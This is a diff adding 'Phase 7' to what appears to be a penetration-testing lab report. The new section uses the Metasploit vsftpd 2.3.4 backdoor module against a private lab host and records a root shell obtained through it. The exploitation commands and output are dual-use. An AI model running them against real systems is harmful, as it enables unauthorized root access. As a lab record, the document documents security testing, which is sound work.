@@ -186,3 +186,56 @@ This proves a critical business risk: unauthenticated/remote compromise due to e
 
 > Evidence: 10_kali_metasploit_exploit_validation_root.jpg
 <img width="1536" height="1152" alt="image" src="https://github.com/user-attachments/assets/2540279d-7486-4020-b5bf-63eb3afb4f64" />
+
+
+## Phase 7 -  launched Metasploit and searched for modules matching:
+
+> search vsftpd
+
+#### I identified:
+
+> exploit/unix/ftp/vsftpd_234_backdoor
+#### Why This Is Important
+
+This demonstrates how:
+- I correlated Nmap version detection (vsftpd 2.3.4)
+
+- I mapped version → known exploit module
+
+- I selected the correct exploit based on service fingerprinting
+
+Afterwards i configured the module:
+
+> set RHOSTS 192.168.56.101
+> run
+
+Metasploit output:
+
+Backdoor service has been spawned
+UID: uid=0(root)
+Command shell session opened
+
+And i then validated access:
+
+> whoami
+
+> root
+
+
+#### What This Proves
+
+That i achieved:
+
+- Remote code execution
+
+- Root-level privilege access
+
+- Full system compromise
+
+This is a complete critical severity breach scenario.
+
+- This is not partial access.
+- This is full administrative control.
+
+> Evidence: 11
+<img width="1536" height="1152" alt="image" src="https://github.com/user-attachments/assets/a4192f66-0dac-43ac-9672-a6f5af572638" />
